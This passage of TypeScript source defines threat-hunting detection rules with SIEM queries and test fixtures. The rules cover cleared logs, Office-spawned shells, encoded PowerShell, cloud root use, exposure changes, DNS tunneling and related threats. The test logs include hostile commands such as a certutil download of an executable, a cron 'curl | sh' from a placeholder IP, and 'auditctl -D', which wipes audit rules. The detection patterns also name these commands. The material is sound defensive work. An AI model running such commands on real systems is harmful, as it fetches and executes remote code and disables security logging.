    version: "1.0",
    changelog: ["1.0 New."],
    title: "Logging or security monitoring turned off",
    tactic: "Defense Evasion",
    techniques: [
      T("T1562.001", "Impair Defenses: Disable or Modify Tools"),
      T("T1562.008", "Impair Defenses: Disable or Modify Cloud Logs"),
      T("T1070.001", "Indicator Removal: Clear Windows Event Logs"),
    ],
    hypothesis: "Someone tried to hide their activity by stopping, deleting or clearing logs or security tools.",
    requires: { sources: ["linux_auth", "windows", "cloudtrail", "okta"], fields: ["time", "actor", "what was stopped or cleared"] },
    logic:
      "Windows 1102/104 log cleared; CloudTrail StopLogging/DeleteTrail/UpdateTrail/PutEventSelectors, GuardDuty/Config disabled; Okta policies or log streams deactivated; Linux audit/syslog/EDR services stopped or log files removed via sudo.",
    severityRule: "High: rarely routine, and evidence may already be missing afterwards.",
    benign: ["Planned maintenance or decommissioning", "Log rotation scripts (rm of rotated files)"],
    tuning: ["Correlate with maintenance windows; never auto-ignore."],
    limitations: ["If logging was stopped successfully, later activity is invisible: check for gaps after this event."],
    queries: {
      splunk:
        'index=* (sourcetype=WinEventLog:Security EventCode=1102) OR (sourcetype=WinEventLog:System EventCode=104) OR (sourcetype=aws:cloudtrail eventName IN ("StopLogging","DeleteTrail","UpdateTrail","PutEventSelectors","DeleteDetector")) OR (sourcetype=linux_secure "COMMAND=" ("auditctl" OR "systemctl stop auditd" OR "history -c"))\n| table _time host user eventName EventCode _raw',
      sentinel:
        'union isfuzzy=true\n  (SecurityEvent | where EventID == 1102 | project TimeGenerated, Computer, Account),\n  (AWSCloudTrail | where EventName in ("StopLogging", "DeleteTrail", "UpdateTrail", "PutEventSelectors", "DeleteDetector") | project TimeGenerated, UserIdentityArn, EventName, SourceIpAddress),\n  (Syslog | where SyslogMessage has_any ("auditctl -D", "systemctl stop auditd", "history -c") | project TimeGenerated, Computer, SyslogMessage)',
      shell:
        "jq -r '.Records[] | select(.eventName|test(\"StopLogging|DeleteTrail|UpdateTrail|PutEventSelectors|DeleteDetector\")) | [.eventTime,.userIdentity.arn,.eventName,.sourceIPAddress] | @tsv' cloudtrail.json\ngrep -hE 'COMMAND=.*(auditctl -D|systemctl (stop|disable) (auditd|rsyslog)|history -c)' /var/log/auth.log*",
      notes: "Small result sets; run across long time ranges.",
    },
    tests: [
      {
        name: "CloudTrail StopLogging",
        expect: "match",
        file: "ct.json",
        log: JSON.stringify({
          Records: [
            {
              eventTime: "2026-10-20T12:30:00Z",
              eventSource: "cloudtrail.amazonaws.com",
              eventName: "StopLogging",
              userIdentity: { type: "IAMUser", userName: "tmp" },
              sourceIPAddress: "203.0.113.20",
              requestParameters: { name: "main" },
            },
          ],
        }),
      },
      { name: "sudo auditctl -D", expect: "match", log: "Oct 20 11:07:00 web1 sudo:  mallory : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/sbin/auditctl -D" },
      {
        name: "Windows log cleared",
        expect: "match",
        file: "win.json",
        log: JSON.stringify({ EventID: 1102, TimeCreated: "2026-10-20T12:31:00Z", Computer: "DC1", EventData: { SubjectUserName: "tmpadmin" } }),
      },
      { name: "Routine sudo", expect: "no_match", log: "Oct 20 11:07:00 web1 sudo:  alice : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx" },
    ],
    detect: (p) => {
      const ev = p.events.filter(
        (e) =>
          (e.category === "logging" && e.outcome !== "failure") ||
          (e.category === "privilege" && e.outcome === "success" && LOG_TAMPER.test(e.command ?? "")) ||
          (e.category === "process" && LOG_TAMPER.test(e.command ?? "")),
      );
      return ev.map((e) =>
        det({
          ruleId: "evasion.logging-disabled",
          key: e.ref,
          title: `Logging or monitoring changed: ${e.target ?? e.action}`,
          observed: `${e.user ?? "Someone"} ${e.category === "logging" ? `ran ${e.action}${e.target ? ` on ${e.target}` : ""}` : `ran "${(e.command ?? "").slice(0, 160)}"`} at ${e.time ?? "unknown time"} on ${e.host ?? e.source}.`,
          severity: "high",
          confidence: "confirmed",
          events: [e],
        }),
      );
    },
  },
  {
    id: "exec.suspicious-parent",
    version: "1.0",
    changelog: ["1.0 New."],
    title: "Office or web server process started a shell",
    tactic: "Execution",
    techniques: [T("T1059", "Command and Scripting Interpreter"), T("T1505.003", "Server Software Component: Web Shell")],
    hypothesis: "A malicious document or a web shell is running commands.",
    requires: { sources: ["windows"], fields: ["process", "parent process", "command line"] },
    logic: "Windows 4688 or Sysmon 1 where the parent is an Office app or a web server and the child is a shell, script host or download tool.",
    severityRule: "High; confidence firm for Office parents, tentative for web servers (some apps shell out by design).",
    benign: ["Macros your business relies on", "Web apps that legitimately run scripts (backup, image tools)"],
    tuning: ["Allow-list known command lines per server after review."],
    limitations: ["Needs process-creation auditing with command lines enabled (4688 + policy, or Sysmon)."],
    queries: {
      splunk:
        'index=* (sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=1) OR (sourcetype=WinEventLog:Security EventCode=4688)\n| eval parent=coalesce(ParentImage, ParentProcessName), child=coalesce(Image, NewProcessName)\n| regex parent="(?i)\\\\(winword|excel|powerpnt|outlook|w3wp|httpd|nginx)\\.exe$"\n| regex child="(?i)\\\\(cmd|powershell|pwsh|wscript|cscript|mshta|rundll32|regsvr32)\\.exe$"\n| table _time host user parent child CommandLine',
      sentinel:
        'SecurityEvent\n| where EventID == 4688\n| where ParentProcessName matches regex @"(?i)\\\\(winword|excel|powerpnt|outlook|w3wp|httpd|nginx)\\.exe$"\n| where NewProcessName matches regex @"(?i)\\\\(cmd|powershell|pwsh|wscript|cscript|mshta|rundll32|regsvr32)\\.exe$"\n| project TimeGenerated, Computer, SubjectUserName, ParentProcessName, NewProcessName, CommandLine',
      shell:
        'jq -c \'select((.EventID==4688 or .EventID==1) and ((.EventData.ParentProcessName // .EventData.ParentImage // "")|test("(?i)(winword|excel|powerpnt|outlook|w3wp)\\\\.exe$")))\' events.jsonl',
      notes: "Filter on the parent first; process-creation volume is high.",
    },
    tests: [
      {
        name: "Word → PowerShell",
        expect: "match",
        file: "sysmon.jsonl",
        log: JSON.stringify({
          EventID: 1,
          ProviderName: "Microsoft-Windows-Sysmon",
          TimeCreated: "2026-10-20T09:00:00Z",
          Computer: "PC7",
          EventData: {
            Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            ParentImage: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            CommandLine: "powershell -nop -w hidden",
            User: "CORP\\dana",
          },
        }),
      },
      {
        name: "Explorer → PowerShell",
        expect: "no_match",
        file: "sysmon.jsonl",
        log: JSON.stringify({
          EventID: 1,
          ProviderName: "Microsoft-Windows-Sysmon",
          TimeCreated: "2026-10-20T09:00:00Z",
          Computer: "PC7",
          EventData: { Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", ParentImage: "C:\\Windows\\explorer.exe", CommandLine: "powershell", User: "CORP\\dana" },
        }),
      },
    ],
    detect: (p) =>
      p.events
        .filter((e) => e.category === "process" && e.parent && e.process && (OFFICE.test(e.parent) || WEB_SERVER.test(e.parent)) && CHILD_SHELL.test(e.process))
        .map((e) => {
          const office = OFFICE.test(e.parent!);
          return det({
            ruleId: "exec.suspicious-parent",
            key: `${e.host}:${e.parent}:${e.process}`,
            title: `${base(e.parent!)} started ${base(e.process!)}${e.host ? ` on ${e.host}` : ""}`,
            observed: `${base(e.parent!)} → ${base(e.process!)} as ${e.user ?? "unknown user"} at ${e.time ?? "unknown time"}${e.command ? `: ${e.command.slice(0, 200)}` : ""}.`,
            severity: "high",
            confidence: office ? "firm" : "tentative",
            events: [e],
          });
        }),
  },
  {
    id: "exec.obfuscated-or-download",
    version: "1.0",
    changelog: ["1.0 New."],
    title: "Encoded PowerShell or download-and-run command",
    tactic: "Execution",
    techniques: [T("T1059.001", "Command and Scripting Interpreter: PowerShell"), T("T1027", "Obfuscated Files or Information"), T("T1105", "Ingress Tool Transfer")],
    hypothesis: "A script fetched or decoded a payload to run it, a common malware pattern.",
    requires: { sources: ["windows", "linux_auth"], fields: ["command line"] },
    logic:
      "Encoded PowerShell (-enc/-EncodedCommand, FromBase64String), certutil -urlcache, bitsadmin /transfer, mshta/regsvr32 with URLs, curl|wget piped to a shell, download cradles with Invoke-Expression; in process events, sudo commands or cron jobs.",
    severityRule: "High; confidence firm (admin tooling also does this sometimes).",
    benign: ["Software installers and management agents (some use encoded PowerShell)", "Admins running install scripts with curl | sh"],
    tuning: ["Allow-list exact command lines of your management tools."],
    limitations: ["Only command lines that were logged; obfuscation beyond these patterns is missed."],
    queries: {
      splunk:
        'index=* (EventCode=4688 OR EventCode=1)\n| eval cmd=coalesce(CommandLine, Process_Command_Line)\n| regex cmd="(?i)(-enc(odedcommand)?\\s+[A-Za-z0-9+/=]{20,}|FromBase64String|certutil.*-urlcache|bitsadmin.*/transfer|(curl|wget).*\\|\\s*(ba)?sh)"\n| table _time host user cmd',
      sentinel:
        'SecurityEvent\n| where EventID == 4688\n| where CommandLine matches regex @"(?i)(-enc(odedcommand)?\\s+[A-Za-z0-9+/=]{20,}|FromBase64String|certutil.*-urlcache|bitsadmin.*/transfer)"\n| project TimeGenerated, Computer, SubjectUserName, NewProcessName, CommandLine',
      shell:
        "grep -hiE '(-enc(odedcommand)? [A-Za-z0-9+/=]{20,}|FromBase64String|certutil.*-urlcache|bitsadmin.*/transfer|(curl|wget) .*https?://.*\\| *(ba)?sh)' events.jsonl /var/log/auth.log* /var/log/syslog* 2>/dev/null",
      notes: "Decode the base64 in an isolated environment to see the script; never run it.",
    },
    tests: [
      {
        name: "certutil download",
        expect: "match",
        file: "win.jsonl",
        log: JSON.stringify({
          EventID: 4688,
          TimeCreated: "2026-10-20T09:01:00Z",
          Computer: "PC7",
          EventData: {
            SubjectUserName: "dana",
            NewProcessName: "C:\\Windows\\System32\\certutil.exe",
            ParentProcessName: "C:\\Windows\\System32\\cmd.exe",
            CommandLine: "certutil -urlcache -split -f http://203.0.113.50/a.exe a.exe",
          },
        }),
      },
      { name: "cron curl | sh", expect: "match", log: "Oct 20 11:10:01 web1 CRON[500]: (mallory) CMD (curl -s http://203.0.113.50/x.sh | sh)" },
      {
        name: "Plain PowerShell",
        expect: "no_match",
        file: "win.jsonl",
        log: JSON.stringify({
          EventID: 4688,
          TimeCreated: "2026-10-20T09:01:00Z",
          Computer: "PC7",
          EventData: {
            SubjectUserName: "dana",
            NewProcessName: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            ParentProcessName: "C:\\Windows\\explorer.exe",
            CommandLine: "powershell Get-Process",
          },
        }),
      },
    ],
    detect: (p) =>
      p.events
        .filter((e) => (e.category === "process" || e.category === "privilege") && e.command && (ENCODED_PS.test(e.command) || DOWNLOAD.test(e.command)))
        .map((e) =>
          det({
            ruleId: "exec.obfuscated-or-download",
            key: e.ref,
            title: `${ENCODED_PS.test(e.command!) ? "Encoded PowerShell" : "Download-and-run command"}${e.host ? ` on ${e.host}` : ""}`,
            observed: `${e.user ?? "Unknown user"} ran: ${e.command!.slice(0, 220)} (${e.time ?? "unknown time"}).`,
            severity: "high",
            confidence: "firm",
            events: [e],
          }),
        ),
  },
  {
    id: "cloud.root-activity",
    version: "1.0",
    changelog: ["1.0 New."],
    title: "Cloud root account used",
    tactic: "Initial Access",
    techniques: [T("T1078.004", "Valid Accounts: Cloud Accounts")],
    hypothesis: "The all-powerful root account was used, possibly by someone who obtained its credentials.",
    requires: { sources: ["cloudtrail"], fields: ["userIdentity.type", "eventName", "MFAUsed"] },
    logic: "Any CloudTrail event with userIdentity.type = Root; console sign-ins without MFA noted.",
    severityRule: "Medium; high for a root console sign-in without MFA.",
    benign: ["Billing or account-level tasks only root can do"],
    tuning: ["Expect a handful of uses a year; alert on every one."],
    limitations: ["Only the uploaded CloudTrail window."],
    queries: {
      splunk: "index=aws sourcetype=aws:cloudtrail userIdentity.type=Root\n| table _time eventName sourceIPAddress additionalEventData.MFAUsed userAgent",
      sentinel: 'AWSCloudTrail\n| where UserIdentityType == "Root"\n| project TimeGenerated, EventName, SourceIpAddress, AdditionalEventData, UserAgent',
      shell: 'jq -r \'.Records[] | select(.userIdentity.type=="Root") | [.eventTime,.eventName,.sourceIPAddress,(.additionalEventData.MFAUsed // "")] | @tsv\' cloudtrail.json',
      notes: "Cheap: filter on identity type.",
    },
    tests: [
      {
        name: "Root console sign-in without MFA",
        expect: "match",
        file: "ct.json",
        log: JSON.stringify({
          Records: [
            {
              eventTime: "2026-10-20T08:00:00Z",
              eventSource: "signin.amazonaws.com",
              eventName: "ConsoleLogin",
              userIdentity: { type: "Root" },
              sourceIPAddress: "198.51.100.77",
              responseElements: { ConsoleLogin: "Success" },
              additionalEventData: { MFAUsed: "No" },
            },
          ],
        }),
      },
    ],
    detect: (p) => {
      const ev = p.events.filter((e) => e.source === "cloudtrail" && e.privileged);
      if (!ev.length) return [];
      const noMfa = ev.some((e) => e.action === "ConsoleLogin" && /MFAUsed=No/.test(e.command ?? "") && e.outcome === "success");
      return [
        det({
          ruleId: "cloud.root-activity",
          key: "root",
          title: `Cloud root account used (${ev.length} event${ev.length === 1 ? "" : "s"})${noMfa ? " — console sign-in without MFA" : ""}`,
          observed: `Root performed ${uniq(ev.map((e) => e.action))
            .slice(0, 8)
            .join(", ")} from ${uniq(ev.map((e) => e.ip)).join(", ") || "unknown"} (${span(ev)}).`,
          severity: noMfa ? "high" : "medium",
          confidence: "confirmed",
          events: ev,
        }),
      ];
    },
  },
  {
    id: "cloud.exposure-change",
    version: "1.0",
    changelog: ["1.0 New."],
    title: "Cloud resource opened to the internet",
    tactic: "Defense Evasion",
    techniques: [T("T1562.007", "Impair Defenses: Disable or Modify Cloud Firewall")],
    hypothesis: "Network or storage access was opened to everyone, deliberately or by mistake.",
    requires: { sources: ["cloudtrail"], fields: ["eventName", "requestParameters"] },
    logic: "AuthorizeSecurityGroupIngress from 0.0.0.0/0 or ::/0; bucket policies or ACLs granting everyone; public access block removed.",
    severityRule: "Medium; high when SSH/RDP/database ports are opened to everyone.",
    benign: ["Intentionally public websites or assets", "Temporary debugging"],
    tuning: ["Tag intentionally public resources and exclude them."],
    limitations: ["Doesn't evaluate the final effective policy, only the change."],
    queries: {
      splunk:
        'index=aws sourcetype=aws:cloudtrail eventName IN ("AuthorizeSecurityGroupIngress","PutBucketPolicy","PutBucketAcl","DeletePublicAccessBlock")\n| search "0.0.0.0/0" OR "AllUsers" OR "\\"Principal\\":\\"*\\"" OR eventName=DeletePublicAccessBlock\n| table _time userIdentity.arn eventName requestParameters',
      sentinel:
        'AWSCloudTrail\n| where EventName in ("AuthorizeSecurityGroupIngress", "PutBucketPolicy", "PutBucketAcl", "DeletePublicAccessBlock")\n| where RequestParameters has_any ("0.0.0.0/0", "::/0", "AllUsers", "\\"Principal\\":\\"*\\"") or EventName == "DeletePublicAccessBlock"\n| project TimeGenerated, UserIdentityArn, EventName, RequestParameters',
      shell:
        'jq -c \'.Records[] | select(.eventName|test("AuthorizeSecurityGroupIngress|PutBucketPolicy|PutBucketAcl|DeletePublicAccessBlock")) | select((.requestParameters|tostring)|test("0\\\\.0\\\\.0\\\\.0/0|::/0|AllUsers|Principal\\\\\\":\\\\\\"\\\\*")) or .eventName=="DeletePublicAccessBlock")\' cloudtrail.json',
      notes: "Small result sets.",
    },
    tests: [
      {
        name: "SSH open to the world",
        expect: "match",
        file: "ct.json",
        log: JSON.stringify({
          Records: [
            {
              eventTime: "2026-10-20T12:40:00Z",
              eventSource: "ec2.amazonaws.com",
              eventName: "AuthorizeSecurityGroupIngress",
              userIdentity: { type: "IAMUser", userName: "tmp" },
              sourceIPAddress: "203.0.113.20",
              requestParameters: { groupId: "sg-1", ipPermissions: { items: [{ fromPort: 22, toPort: 22, ipRanges: { items: [{ cidrIp: "0.0.0.0/0" }] } }] } },
            },
          ],
        }),
      },
      {
        name: "Office range only",
        expect: "no_match",
        file: "ct.json",
        log: JSON.stringify({
          Records: [
            {
              eventTime: "2026-10-20T12:40:00Z",
              eventSource: "ec2.amazonaws.com",
              eventName: "AuthorizeSecurityGroupIngress",
              userIdentity: { type: "IAMUser", userName: "ops" },
              sourceIPAddress: "203.0.113.20",
              requestParameters: { groupId: "sg-1", ipPermissions: { items: [{ fromPort: 22, toPort: 22, ipRanges: { items: [{ cidrIp: "198.51.100.0/24" }] } }] } },
            },
          ],
        }),
      },
    ],
    detect: (p) =>
      p.events
        .filter((e) => e.source === "cloudtrail" && e.outcome === "success" && /^(AuthorizeSecurityGroupIngress|PutBucketPolicy|PutBucketAcl|DeletePublicAccessBlock)$/.test(e.action))
        .filter((e) => e.action === "DeletePublicAccessBlock" || /0\.0\.0\.0\/0|::\/0|AllUsers|"Principal":"\*"|"Principal":\{"AWS":"\*"\}/.test(e.raw))
        .map((e) => {
          const admin = /"fromPort":(22|3389|3306|5432|1433|6379|27017)\b/.test(e.raw);
          return det({
            ruleId: "cloud.exposure-change",
            key: e.ref,
            title: `${e.action} opened ${e.target ?? "a resource"} to everyone`,
            observed: `${e.user ?? "Someone"} ran ${e.action} on ${e.target ?? "?"} at ${e.time ?? "unknown time"} from ${e.ip ?? "unknown"}${admin ? "; the change includes an administrative or database port" : ""}.`,
            severity: admin ? "high" : "medium",
            confidence: "confirmed",
            events: [e],
          });
        }),
  },
  {
    id: "auth.new-source",
    version: "1.0",
    changelog: ["1.0 New."],
    title: "Sign-in from a source never seen for that user",
    tactic: "Initial Access",
    techniques: [T("T1078", "Valid Accounts")],
    hypothesis: "Someone else is using the account from a new location or network.",
    requires: { sources: ["ssh", "cloudtrail", "okta", "windows", "json"], fields: ["time", "user", "source IP", "outcome"] },
    logic:
      "A successful sign-in in the last 24 hours of the logs from an address range (/24 for IPv4, /48 for IPv6) the user never signed in from before. Only for users with at least 7 days and 10 successful sign-ins of history in the logs.",
    severityRule: "Low; confidence tentative (travel, new ISPs and VPNs are common).",
    benign: ["Travel or working from a new place", "Mobile networks and ISP address changes", "A new VPN exit"],
    tuning: ["Feed known VPN and office ranges as 'seen' for everyone."],
    limitations: ["No geolocation; ranges are a rough proxy.", "Users without enough history aren't assessed — the run says how many."],
    queries: {
      splunk:
        'index=* (sourcetype=linux_secure "Accepted") OR (sourcetype=WinEventLog:Security EventCode=4624)\n| eval range=replace(src_ip, "\\.\\d+$", ".0/24")\n| stats earliest(_time) AS first_seen BY user range\n| where first_seen > relative_time(now(), "-1d")',
      sentinel:
        "let history = SigninLogs | where TimeGenerated between (ago(30d) .. ago(1d)) | summarize by UserPrincipalName, Range = parse_ipv4_mask(IPAddress, 24);\nSigninLogs\n| where TimeGenerated > ago(1d) and ResultType == 0\n| extend Range = parse_ipv4_mask(IPAddress, 24)\n| join kind=leftanti history on UserPrincipalName, Range\n| project TimeGenerated, UserPrincipalName, IPAddress, Location",
      shell:
        'grep -h \'Accepted\' /var/log/auth.log* | awk \'{for(i=1;i<=NF;i++){if($i=="for")u=$(i+1); if($i=="from")ip=$(i+1)}; split(ip,a,"."); print u, a[1]"."a[2]"."a[3]".0/24"}\' | sort | uniq -c',
      notes: "Needs history: run the baseline over 30 days and compare with the last day.",
    },
    tests: [],
    detect: (p) => newSourceDetections(p.events).detections,
  },
  {
    id: "data.large-transfer",
    version: "1.0",
    changelog: ["1.0 New."],
    title: "Unusual amount of data sent to one client",
    tactic: "Exfiltration",
    techniques: [],
    hypothesis: "Data is being pulled out in bulk through the web application.",
    requires: { sources: ["web_access"], fields: ["source IP", "response bytes"] },
    logic: "Total response bytes to one client of at least 200 MB and at least 10× the median client, with at least 5 clients to compare.",
    severityRule: "Low to medium; tentative. No technique is mapped because the logs can't show what the data was.",
    benign: ["Large legitimate downloads (installers, media, backups)", "Crawlers and mirrors"],
    tuning: ["Exclude static download paths; compare per endpoint."],
    limitations: ["Response sizes only; request bodies and other channels aren't visible."],
    queries: {
      splunk:
        "index=web sourcetype=access_combined\n| stats sum(bytes) AS total count BY clientip\n| eventstats median(total) AS med\n| where total >= 200*1024*1024 AND total >= 10*med\n| sort - total",
      sentinel:
        "W3CIISLog\n| summarize Total = sum(scBytes), Requests = count() by cIP\n| extend Median = toscalar(W3CIISLog | summarize T = sum(scBytes) by cIP | summarize percentile(T, 50))\n| where Total >= 200*1024*1024 and Total >= 10*Median\n| order by Total desc",
      shell: "awk '{b[$1]+=$10} END {for (ip in b) print b[ip], ip}' access.log | sort -rn | head",
      notes: "Aggregate per day for long periods.",
    },
    tests: [],
    detect: (p) => {
      const web = p.events.filter((e) => e.category === "web" && e.ip && typeof e.bytes === "number");
      const totals = [...group(web, (e) => e.ip)].map(([ip, list]) => ({ ip, list, total: list.reduce((n, e) => n + (e.bytes ?? 0), 0) }));
      if (totals.length < 5) return [];
      const median = [...totals].sort((a, b) => a.total - b.total)[Math.floor(totals.length / 2)]!.total;
      return totals
        .filter((t) => t.total >= 200 * 1024 * 1024 && t.total >= 10 * Math.max(median, 1))
        .map((t) =>
          det({
            ruleId: "data.large-transfer",
            key: t.ip,
            title: `${(t.total / 1024 / 1024).toFixed(0)} MB sent to ${t.ip}`,
            observed: `${t.list.length} responses totalling ${(t.total / 1024 / 1024).toFixed(1)} MB to ${t.ip} (median client: ${(median / 1024 / 1024).toFixed(1)} MB) (${span(t.list)}); top paths: ${uniq(
              t.list.sort((a, b) => (b.bytes ?? 0) - (a.bytes ?? 0)).map((e) => e.path),
            )
              .slice(0, 3)
              .join(", ")}.`,
            severity: t.total >= 1024 * 1024 * 1024 ? "medium" : "low",
            confidence: "tentative",
            events: t.list.sort((a, b) => (b.bytes ?? 0) - (a.bytes ?? 0)),
          }),
        );
    },
  },
  {
    id: "dns.tunneling-suspect",
    version: "1.0",
    changelog: ["1.0 New."],
    title: "Possible DNS tunneling",
    tactic: "Command and Control",
    techniques: [T("T1071.004", "Application Layer Protocol: DNS")],
    hypothesis: "Data or commands are being carried in DNS query names.",
    requires: { sources: ["dns"], fields: ["client IP", "query name"] },
    logic: "One client querying 25+ distinct long (30+ characters) or high-entropy subdomains of the same domain. Domains of common security and CDN services that use long names are listed as such.",
    severityRule: "Medium; tentative.",
    benign: ["Anti-virus and reputation lookups that encode hashes in names", "CDN and telemetry services"],
    tuning: ["Add domains you've verified to the known-benign list."],
    limitations: ["Registered-domain detection is approximate for some country suffixes.", "Low-and-slow tunnels below the threshold are missed."],
    queries: {
      splunk: 'index=dns\n| rex field=query "(?<sub>.+)\\.(?<domain>[^.]+\\.[^.]+)$"\n| where len(sub) >= 30\n| stats dc(query) AS names BY src domain\n| where names >= 25',
      sentinel:
        'DnsEvents\n| extend Domain = strcat(split(Name, ".")[-2], ".", split(Name, ".")[-1]), Sub = substring(Name, 0, strlen(Name) - strlen(Domain) - 1)\n| where strlen(Sub) >= 30\n| summarize Names = dcount(Name) by ClientIP, Domain\n| where Names >= 25',
      shell:
        "awk '{print $0}' dns.log | grep -oE 'query: [^ ]+' | awk '{n=split($2,a,\".\"); if (length($2)-length(a[n-1])-length(a[n])-2 >= 30) print a[n-1]\".\"a[n]}' | sort | uniq -c | sort -rn | head",
      notes: "Field names vary by DNS source; group per client and registered domain.",
    },
    tests: [],
    detect: (p) => dnsTunneling(p.events),
  },
  {
    id: "dns.nxdomain-burst",
    version: "1.0",
    changelog: ["1.0 New."],
    title: "Many failed lookups of random-looking domains",
    tactic: "Command and Control",
    techniques: [T("T1568.002", "Dynamic Resolution: Domain Generation Algorithms")],
    hypothesis: "Malware is cycling through generated domain names to find its controller.",
    requires: { sources: ["dns"], fields: ["client IP", "query name", "response code"] },
    logic: "One client with 50+ NXDOMAIN answers, 30+ of them for distinct random-looking names.",
    severityRule: "Medium; tentative.",
    benign: ["Misconfigured search domains", "Ad blockers and browser prefetching", "Typos at scale from an app bug"],
    tuning: ["Exclude internal suffixes appended by search-domain configuration."],
    limitations: ["Needs response codes (Zeek-style DNS logs); simple query logs don't include them."],
    queries: {
      splunk: "index=dns reply_code=NXDomain\n| stats count dc(query) AS names BY src\n| where count >= 50 AND names >= 30",
      sentinel: "DnsEvents\n| where ResultCode == 3\n| summarize Failures = count(), Names = dcount(Name) by ClientIP\n| where Failures >= 50 and Names >= 30",
      shell: "jq -r 'select(.rcode_name==\"NXDOMAIN\") | .[\"id.orig_h\"]' dns.log | sort | uniq -c | sort -rn | awk '$1>=50'",
      notes: "Requires response codes.",
    },
    tests: [],
    detect: (p) => {
      const nx = p.events.filter((e) => e.category === "dns" && e.rcode && /NXDOMAIN/i.test(e.rcode));
      const out: Detection[] = [];
      for (const [ip, list] of group(nx, (e) => e.ip)) {
        const random = uniq(list.map((e) => e.query)).filter((q) => entropy(q.split(".")[0]!) >= 3.3 && q.split(".")[0]!.length >= 8);
        if (list.length >= 50 && random.length >= 30)
          out.push(
            det({
              ruleId: "dns.nxdomain-burst",
              key: ip,
              title: `${list.length} failed lookups from ${ip}`,
              observed: `${list.length} NXDOMAIN answers to ${ip}, ${random.length} for random-looking names such as ${random.slice(0, 3).join(", ")} (${span(list)}).`,
              severity: "medium",
              confidence: "tentative",
              events: list,
            }),
          );
      }
      return out;
    },
  },
];

export const HUNT_RULES: HuntRule[] = [...LEGACY, ...RULES_NEW];
export const ruleById = (id: string) => HUNT_RULES.find((r) => r.id === id || (r.id === "web.payload" && id.startsWith("web.payload-")));

const base = (p: string) => p.split(/[\\/]/).pop() ?? p;

export function entropy(s: string): number {
  if (!s) return 0;
  const counts = new Map<string, number>();
  for (const c of s) counts.set(c, (counts.get(c) ?? 0) + 1);
  return [...counts.values()].reduce((h, n) => h - (n / s.length) * Math.log2(n / s.length), 0);
}

/** Registered domain, approximately: last two labels, or three for short country suffixes like co.uk. */
export function registeredDomain(name: string): string {
  const parts = name.replace(/\.$/, "").split(".");
  if (parts.length <= 2) return parts.join(".");
  const tld = parts.at(-1)!;
  const sld = parts.at(-2)!;
  return tld.length === 2 && sld.length <= 3 ? parts.slice(-3).join(".") : parts.slice(-2).join(".");
}

/** Services known to use long or hash-like names legitimately. */
export const DNS_KNOWN_BENIGN = [
  "sophosxl.net",
  "mcafee.com",
  "trendmicro.com",
  "akamaiedge.net",
  "cloudfront.net",
  "amazonaws.com",
  "googleusercontent.com",
  "windowsupdate.com",
  "spotify.com",
  "apple.com",
  "icloud.com",
];

function dnsTunneling(events: HuntEvent[]): Detection[] {
  const q = events.filter((e) => e.category === "dns" && e.query && e.ip);
  const out: Detection[] = [];
  for (const [k, list] of group(q, (e) => `${e.ip}|${registeredDomain(e.query!)}`)) {
    const [ip, domain] = k.split("|") as [string, string];
    const long = uniq(list.map((e) => e.query)).filter((n) => {
      const sub = n.slice(0, Math.max(0, n.length - domain.length - 1));
      return sub.length >= 30 || (sub.length >= 20 && entropy(sub.replace(/\./g, "")) >= 3.8);
    });
    if (long.length < 25) continue;
    const known = DNS_KNOWN_BENIGN.some((d) => domain === d || domain.endsWith(`.${d}`));
    out.push(
      det({
        ruleId: "dns.tunneling-suspect",
        key: k,
        title: `${long.length} long or random-looking names under ${domain} from ${ip}`,
        observed: `${ip} queried ${long.length} distinct long/high-entropy subdomains of ${domain} (${span(list)}), e.g. ${long[0]!.slice(0, 80)}.${known ? ` ${domain} is a service known to use names like this.` : ""}`,
        severity: known ? "info" : "medium",
        confidence: "tentative",
        events: list.filter((e) => long.includes(e.query!)),
      }),
    );
  }
  return out;
}

const prefix = (ip: string) => (ip.includes(":") ? ip.split(":").slice(0, 3).join(":") + "::/48" : ip.split(".").slice(0, 3).join(".") + ".0/24");

/** New-source sign-ins, and how many users had too little history to judge (reported, not hidden). */
export function newSourceDetections(events: HuntEvent[]): { detections: Detection[]; assessed: number; insufficient: number } {
  const ok = events.filter((e) => e.category === "auth" && e.outcome === "success" && e.user && e.ip && e.time);
  const times = ok.map((e) => Date.parse(e.time!));
  if (!times.length) return { detections: [], assessed: 0, insufficient: 0 };
  const end = Math.max(...times);
  const cutoff = end - 24 * 3_600_000;
  const out: Detection[] = [];
  let assessed = 0;
  let insufficient = 0;
  for (const [user, list] of group(ok, (e) => e.user!.toLowerCase())) {
    const history = list.filter((e) => Date.parse(e.time!) < cutoff);
    const recent = list.filter((e) => Date.parse(e.time!) >= cutoff);
    if (!recent.length) continue;
    const spanDays = history.length ? (cutoff - Math.min(...history.map((e) => Date.parse(e.time!)))) / 86_400_000 : 0;
    if (history.length < 10 || spanDays < 7) {
      insufficient++;
      continue;
    }
    assessed++;
    const seen = new Set(history.map((e) => prefix(e.ip!)));
    const fresh = recent.filter((e) => !seen.has(prefix(e.ip!)));
    if (fresh.length)
      out.push(
        det({
          ruleId: "auth.new-source",
          key: `${user}|${prefix(fresh[0]!.ip!)}`,
          title: `${user} signed in from a new network (${prefix(fresh[0]!.ip!)})`,
          observed: `${fresh.length} successful sign-in(s) for ${user} from ${uniq(fresh.map((e) => e.ip)).join(", ")} in the last 24 hours of the logs; none of the user's ${history.length} earlier sign-ins over ${spanDays.toFixed(0)} days came from that range.`,
          severity: "low",
          confidence: "tentative",
          events: fresh,
        }),
      );
  }
  return { detections: out, assessed, insufficient };
}

/* ------------------------------------------------------------ test runs */

export interface RuleTestResult {
  ruleId: string;
  name: string;
  expect: RuleTest["expect"];
  passed: boolean;
}

/** Run a rule's own test cases: parse the sample, run the rule, compare with the expectation. */
export function runRuleTests(rule: HuntRule, year = 2026): RuleTestResult[] {
  return rule.tests.map((t) => {
    const parsed = parseHuntLogs([{ name: t.file ?? "sample.log", content: t.log }], year);
    const matched = rule.legacy ? legacyMatches(rule.id, parsed.legacy) : (rule.detect?.(parsed).length ?? 0) > 0;
    return { ruleId: rule.id, name: t.name, expect: t.expect, passed: matched === (t.expect === "match") };
  });
}

function legacyMatches(id: string, legacy: LogEvent[]): boolean {
